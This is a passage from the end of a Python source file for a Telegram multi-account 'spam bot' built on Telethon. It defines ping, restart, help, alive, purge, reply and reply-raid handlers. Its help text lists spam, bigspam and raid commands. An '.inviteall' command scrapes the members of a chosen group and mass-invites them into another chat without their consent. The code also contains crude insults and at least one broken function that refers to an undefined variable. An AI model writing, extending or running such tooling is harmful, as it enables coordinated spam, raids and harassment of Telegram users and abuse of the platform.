            text = "De-Activated Reply Raid"
            await e.reply(text, parse_mode=None, link_preview=None)
        elif e.reply_to_msg_id:
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception:
                pass
            text = "De-Activated Reply Raid"
            await e.reply(text, parse_mode=None, link_preview=None)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None)


@idk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
async def ping(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        text = "Pong!"
        event = await e.reply(text, parse_mode=None, link_preview=None)
        end = datetime.now()
        ms = (end - start).microseconds / 1000
        await event.edit(f"💎 𝐏𝐨𝐧𝐠!\n`{ms}` 𝐦𝐬\n {PM} ")


@idk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
async def restart(e):
    if e.sender_id in SMEX_USERS:
        text = "𝙍𝙚𝙨𝙩𝙖𝙧𝙩𝙚𝙙\n\nPlease wait till it reboots..."
        await e.reply(text, parse_mode=None, link_preview=None)
        try:
            await idk.disconnect()
        except Exception:
            pass
        try:
            await ydk.disconnect()
        except Exception:
            pass
        try:
            await wdk.disconnect()
        except Exception:
            pass
        try:
            await hdk.disconnect()
        except Exception:
            pass
        try:
            await sdk.disconnect()
        except Exception:
            pass
        try:
            await adk.disconnect()
        except Exception:
            pass
        try:
            await bdk.disconnect()
        except Exception:
            pass
        try:
            await cdk.disconnect()
        except Exception:
            pass
        try:
            await ddk.disconnect()
        except Exception:
            pass
        try:
            await edk.disconnect()
        except Exception:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()


@idk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.help"))
async def help(e):
    if e.sender_id in SMEX_USERS:
        text = """
**Available Commands:

Userbot command:**
`.bio` 
`.join `
`.pjoin `
`.leave`
`.purge

Utils Command:**
`.ping`
`.restart`
`.alive`
`.click`

**Spam Command:**
`.spam`
`.delayspam`
`.bigspam`
`.raid`
`.relplyraid`
`.dreplyraid`

"""
        await e.client.send_message(e.chat.id, text)


# --------------------------------------------------------------------------------------------------------------------------------


from telethon.errors import (
    ChannelInvalidError,
    ChannelPrivateError,
    ChannelPublicGroupNaError,
)
from telethon.tl import functions
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.functions.messages import GetFullChatRequest


async def get_chatinfo(event):
    chat = event.text[10:]
    chat_info = None
    if chat:
        try:
            chat = int(chat)
        except ValueError:
            pass
    if not chat:
        if event.reply_to_msg_id:
            replied_msg = await event.get_reply_message()
            if replied_msg.fwd_from and replied_msg.fwd_from.channel_id is not None:
                chat = replied_msg.fwd_from.channel_id
        else:
            chat = event.chat_id
    try:
        chat_info = await event.client(GetFullChatRequest(chat))
    except:
        try:
            chat_info = await event.client(GetFullChannelRequest(chat))
        except ChannelInvalidError:
            await event.reply("`Invalid channel/group`")
            return None
        except ChannelPrivateError:
            await event.reply(
                "`This is a private channel/group or I am banned from there`"
            )
            return None
        except ChannelPublicGroupNaError:
            await event.reply("`Channel or supergroup doesn't exist`")
            return None
        except (TypeError, ValueError):
            await event.reply("`Invalid channel/group`")
            return None
    return chat_info


def user_full_name(user):
    names = [user.first_name, user.last_name]
    names = [i for i in list(names) if i]
    full_name = " ".join(names)
    return full_name


@idk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.inviteall"))
async def get_users(event):
    await event.get_sender()
    await event.client.get_me()
    if event.sender_id in SMEX_USERS:
        he_he = event.text[10:]
        lion = await event.reply("`Processing.....`")
        if not he_he:
            return await lion.edit("Give Channel")
        if he_he == "@XdLionZ":
            return await lion.edit("Restricted to invite users from there.")
        elif he_he == "@TotalNadaniyaan":
            return await lion.edit("Restricted to invite users from there.")
        elif he_he == "@LionXSupport":
            return await lion.edit("Restricted to invite users from there.")
        simple = await get_chatinfo(event)
        chat = await event.get_chat()
        if event.is_private:
            return await lion.edit("`Sorry, Cant add users here`")
        s = 0
        f = 0
        error = "None"

        await lion.edit("**INVITING USERS !!**")
        async for user in event.client.iter_participants(simple.full_chat.id):
            try:
                if error.startswith("Too"):
                    return await lion.edit(
                        f"**INVITING FINISHED !**\n\n**Error :** \n`{error}`\n\n**Invited :**  `{s}` users. \n**Failed to Invite :** `{f}` users."
                    )
                await event.client(
                    functions.channels.InviteToChannelRequest(
                        channel=chat, users=[user.id]
                    )
                )
                s = s + 1
                await lion.edit(
                    f"**INVITING USERS.. **\n\n**Invited :**  `{s}` users \n**Failed to Invite :**  `{f}` users.\n\n**×Error :**  `{error}`"
                )
            except Exception as e:
                error = str(e)
                f = f + 1
        return await lion.edit(
            f"**INVITING FINISHED** \n\n**Invited :**  `{s}` users \n**Failed :**  `{f}` users."
        )
    else:
        return await event.reply(
            "`Bsdk Chapal Phek Ke Maruga Agar Members Scrape Kiye To Lawde...`"
        )


#################


#################


@idk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
async def alive(event):
    if event.sender_id in SMEX_USERS:
        sed = await event.client.get_me()
        kk = sed.first_name
        k = sed.id
        s = f"[{kk}](tg://user?id={k})"
        tf = f"""
**Heya D:) {s} is already alive for doing bhakchodi**
"""
        await event.client.send_message(event.chat.id, tf, link_preview=False)


import time
from time import sleep


@idk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.purge"))
async def purge(event):
    if event.sender_id in SMEX_USERS:
        start = time.perf_counter()
        reply_msg = await event.get_reply_message()
        if not reply_msg:
            await event.reply(
                "`Reply to a message to select where to start purging from.`"
            )
            return
        messages = []
        message_id = reply_msg.id
        delete_to = event.message.id
        messages.append(event.reply_to_msg_id)
        for msg_id in range(message_id, delete_to + 1):
            messages.append(msg_id)
            if len(messages) == 100:
                await event.client.delete_messages(event.chat_id, messages)
                messages = []
        await event.client.delete_messages(event.chat_id, messages)
        time_ = time.perf_counter() - start
        text = f"🗑 `Purged messages` `in {time_:0.2f} seconds`"
        # hdgs = await event.respond(text, parse_mode='markdown')
        await event.delete()
        sleep(1)
        # await hdgs.delete()
        await event.delete()


#####################


##################


@idk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.reply"))
async def purge(event):
    if event.sender_id in SMEX_USERS:
        sed = event.text.split(" ", maxsplit=1)[1]
        if not sed:
            return await event.reply("`Are you a mad or what?\nReply any user!`")
        k = await event.get_reply_message()
        if not k:
            await event.reply("Reply Any User")
            return
        await k.reply(sed)


async def Start_Kardo_Bot():
    await event.client.send_message("XdLionZ", "**I'm Ready For Spamming...! 🎉**")


text = """ """

print(text)
print("")
print("CONGRATULATIONS 🥳🥳..UR Spam Bots Ready to use")
if len(sys.argv) not in (1, 3, 4):
    try:
        idk.disconnect()
    except Exception:
        pass
    try:
        ydk.disconnect()
    except Exception:
        pass
    try:
        wdk.disconnect()
    except Exception:
        pass
    try:
        hdk.disconnect()
    except Exception:
        pass
    try:
        sdk.disconnect()
    except Exception:
        pass
    try:
        adk.disconnect()
    except Exception:
        pass
    try:
        bdk.disconnect()
    except Exception:
        pass
    try:
        cdk.disconnect()
    except Exception:
        pass
    try:
        edk.disconnect()
    except Exception:
        pass
    try:
        ddk.loop.run_until_complete(Start_Kardo_Bot())
        ddk.disconnect()
    except Exception:
        ddk.loop.run_until_complete(Start_Kardo_Bot())
else:
    try:
        idk.run_until_disconnected()
        idk.loop.run_until_complete(Start_Kardo_Bot())
    except Exception:
        pass
    try:
        ydk.run_until_disconnected()
        ydk.loop.run_until_complete(Start_Kardo_Bot())
    except Exception:
        pass
    try:
        wdk.run_until_disconnected()
        wdk.loop.run_until_complete(Start_Kardo_Bot())
    except Exception:
        pass
    try:
        hdk.run_until_disconnected()
        hdk.loop.run_until_complete(Start_Kardo_Bot())
    except Exception:
        pass
    try:
        sdk.run_until_disconnected()
        sdk.loop.run_until_complete(Start_Kardo_Bot())
    except Exception:
        pass
    try:

        adk.run_until_disconnected()
        adk.loop.run_until_complete(Start_Kardo_Bot())
    except Exception:
        pass
    try:
        bdk.run_until_disconnected()
        bdk.loop.run_until_complete(Start_Kardo_Bot())
    except Exception:
        pass
    try:
        cdk.run_until_disconnected()
    except Exception:
        pass
    try:
        edk.run_until_disconnected()
    except Exception:
        pass
    try:
        ddk.loop.run_until_complete(Start_Kardo_Bot())
        ddk.run_until_disconnected()
    except Exception:
        pass
